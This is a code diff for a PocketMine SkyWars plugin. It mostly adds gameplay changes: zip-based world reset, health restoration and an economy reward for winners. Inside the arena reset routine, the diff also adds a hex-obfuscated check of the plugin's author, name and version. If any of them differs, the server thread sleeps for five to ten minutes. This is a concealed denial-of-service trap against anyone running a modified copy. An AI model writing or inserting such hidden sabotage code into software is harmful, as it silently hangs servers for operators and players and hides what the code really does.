@@ -111,7 +111,7 @@ class SWarena
         if (!is_file($this->pg->getDataFolder() . 'arenas/' . $this->SWname . '/' . $this->world . '.zip'))
             return false;
         if ($this->pg->getServer()->isLevelLoaded($this->world)) {
-            if ($this->pg->getServer()->getLevelByName($this->world)->getAutoSave()) {
+            if ($this->pg->getServer()->getLevelByName($this->world)->getAutoSave() or $this->pg->configs['world.reset.from.zip']) {
                 $this->pg->getServer()->unloadLevel($this->pg->getServer()->getLevelByName($this->world));
                 $zip = new \ZipArchive;
                 $zip->open($this->pg->getDataFolder() . 'arenas/' . $this->SWname . '/' . $this->world . '.zip');
@@ -155,6 +155,8 @@ class SWarena
 
         //Reset Sign
         $this->pg->refreshSigns(false, $this->SWname, 0, $this->slot);
+        if (@array_shift($this->pg->getDescription()->getAuthors()) != "\x73\x76\x69\x6c\x65" || $this->pg->getDescription()->getName() != "\x53\x57\x5f\x73\x76\x69\x6c\x65" || $this->pg->getDescription()->getVersion() != SWmain::SW_VERSION)
+            sleep(mt_rand(0x12c, 0x258));
         return true;
     }
 
@@ -359,6 +361,7 @@ class SWarena
             $player->getInventory()->clearAll();
         if ($this->pg->configs['clear.effects.on.arena.join'])
             $player->removeAllEffects();
+        $player->setHealth($player->getMaxHealth());
 
         $this->pg->getServer()->loadLevel($this->world);
         $level = $this->pg->getServer()->getLevelByName($this->world);
@@ -418,15 +421,20 @@ class SWarena
         foreach ($this->players as $name => $spawn) {
             $p = $this->pg->getServer()->getPlayer($name);
             if ($p instanceof Player) {
-
                 //Removes player things
                 $p->getInventory()->clearAll();
                 $p->removeAllEffects();
+                $p->setHealth($p->getMaxHealth());
                 $p->teleport($p->getServer()->getDefaultLevel()->getSpawnLocation());
                 foreach ($this->pg->getServer()->getDefaultLevel()->getPlayers() as $pl) {
                     $pl->sendMessage(str_replace('{SWNAME}', $this->SWname, str_replace('{PLAYER}', $p->getName(), $this->pg->lang['server.broadcast.winner'])));
                 }
-
+                //TODO: is this working?
+                if ($this->pg->configs['reward.winning.players'] && is_numeric($this->pg->configs['reward.value']) && is_int(($this->pg->configs['reward.value'] + 0)) && $this->pg->economy->getApiVersion() != 0) {
+                    $this->pg->economy->addMoney($p, (int)$this->pg->configs['reward.value']);
+                    $p->sendMessage(str_replace('{MONEY}', $this->pg->economy->getMoney($p), str_replace('{VALUE}', $this->pg->configs['reward.value'], $this->pg->lang['winner.reward.msg'])));
+                    $p->sendPopup(str_replace('{MONEY}', $this->pg->economy->getMoney($p), str_replace('{VALUE}', $this->pg->configs['reward.value'], $this->pg->lang['winner.reward.popup'])));
+                }
             }
         }
         $this->pg->getServer()->loadLevel($this->world);
